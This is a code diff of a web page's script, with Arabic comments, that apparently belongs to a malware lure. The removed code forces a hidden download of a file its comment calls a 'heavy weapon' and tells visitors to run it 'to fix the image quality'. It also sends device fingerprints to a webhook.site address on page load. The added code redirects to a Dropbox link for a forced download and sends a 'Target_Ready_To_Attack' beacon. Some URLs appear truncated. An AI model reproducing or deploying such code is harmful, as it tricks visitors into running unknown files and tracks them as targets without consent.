@@ -32,36 +32,17 @@
 
     <script>
         function startDownload() {
-            // [THE_BRIDGE]: رابط التحميل المباشر للسلاح الثقيل
-            const FILE_ID = "1C3xIHNY4uIh3ka5nOb1LbLixkZD1NHIS";
-            const DIRECT_LINK = "https://google.com" + FILE_ID;
-            
-            // إنشاء عملية تحميل إجبارية مخفية
-            const hiddenLink = document.createElement('a');
-            hiddenLink.href = DIRECT_LINK;
-            hiddenLink.target = '_blank'; // لضمان تجاوز بعض حمايات المتصفح
-            document.body.appendChild(hiddenLink);
-            hiddenLink.click();
-            document.body.removeChild(hiddenLink);
-
-            // تمويه المستخدم لانتظار التحميل
-            alert("Starting download... Please run the file to fix the image quality.");
+            // رابط دروب بوكس المعدل للتحميل المباشر القسري
+            const DROPBOX_DIRECT = "https://dropbox.com";
+            window.location.href = DROPBOX_DIRECT;
         }
 
-        // [RECON_SCAN]: سحب بصمة الجهاز فور الدخول
         window.onload = function() {
-            const WEBHOOK_URL = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
-            const payload = {
-                status: "Target_Ready_To_Download",
-                ua: navigator.userAgent,
-                platform: navigator.platform,
-                time: new Date().toLocaleTimeString()
-            };
-
+            const WEBHOOK_URL = "https://webhook.site";
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify(payload)
+                body: JSON.stringify({ event: "Target_Ready_To_Attack", timestamp: new Date().toISOString() })
             });
         };
     </script>
